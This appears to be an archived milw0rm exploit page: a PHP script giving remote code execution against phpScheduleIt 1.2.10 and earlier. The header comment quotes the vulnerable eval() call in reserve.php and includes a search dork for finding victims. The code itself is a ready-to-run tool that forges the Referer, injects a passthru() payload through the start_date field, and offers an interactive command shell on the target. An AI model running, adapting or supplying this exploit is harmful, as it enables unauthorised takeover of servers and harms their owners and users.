<html><head><title>phpScheduleIt <= 1.2.10 (reserve.php) Remote Code Execution Exploit</title></head><pre>&lt;?php

/*
	-------------------------------------------------------------------
	phpScheduleIt &lt;= 1.2.10 (reserve.php) Remote Code Execution Exploit
	-------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://phpscheduleit.sourceforge.net/
	dork.....: inurl:roschedule.php
	details..: works with magic_quotes_gpc = off
	
	[-] vulnerable code in /reserve.php
	
	51.	if (isset($_POST['btnSubmit']) &amp;&amp; strstr($_SERVER['HTTP_REFERER'], $_SERVER['PHP_SELF'])) {
	52.		$t-&gt;set_title(translate(&quot;Processing $Class&quot;));
	53.		$t-&gt;printHTMLHeader();
	54.		$t-&gt;startMain();
	55.	
	56.		process_reservation($_POST['fn']);
	57.	}
	58.	else {
	59.		$res_info = getResInfo();
	60.		$t-&gt;set_title($res_info['title']);
	61.		$t-&gt;printHTMLHeader();
	62.	   	$t-&gt;startMain();
	63.	   	present_reservation($res_info['resid']);
	64.	}

	[...]
	
	79.	function process_reservation($fn) {
	80.		$success = false;
	81.		global $Class;
	82.		$is_pending = (isset($_POST['pending']) &amp;&amp; $_POST['pending']);
	83.	
	84.		if (isset($_POST['start_date'])) {			// Parse the POST-ed starting and ending dates
	85.			$start_date = eval('return mktime(0,0,0, \'' . str_replace(INTERNAL_DATE_SEPERATOR, '\',\'', $_POST['start_date']) . '\');');
	86.			$end_date = eval('return mktime(0,0,0, \'' . str_replace(INTERNAL_DATE_SEPERATOR, '\',\'', $_POST['end_date']) . '\');');
	87.		}
	
	An attacker might be able to inject and execute PHP code through $_POST['start_date'], that is passed to eval() at line 85
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print &quot;\n+---------------------------------------------------------------+&quot;;
print &quot;\n| phpScheduleIt &lt;= 1.2.10 Remote Code Execution Exploit by EgiX |&quot;;
print &quot;\n+---------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /phpscheduleit/\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

$payload = &quot;btnSubmit=1&amp;start_date=1').\${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${die};%%23&quot;;
$packet  = &quot;POST {$path}reserve.php HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Referer: {$path}reserve.php\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Content-Length: &quot;.(strlen($payload)-1).&quot;\r\n&quot;;
$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;
$packet .= $payload;

while(1)
{
	print &quot;\nphpscheduleit-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$html  = http_send($host, sprintf($packet, base64_encode($cmd)));
		$shell = explode(&quot;_code_&quot;, $html);
		preg_match(&quot;/_code_/&quot;, $html) ? print &quot;\n{$shell[1]}&quot; : die(&quot;\n[-] Exploit failed...\n&quot;);
	}
	else break;
}

?&gt;

# milw0rm.com [2008-10-01]</pre></html>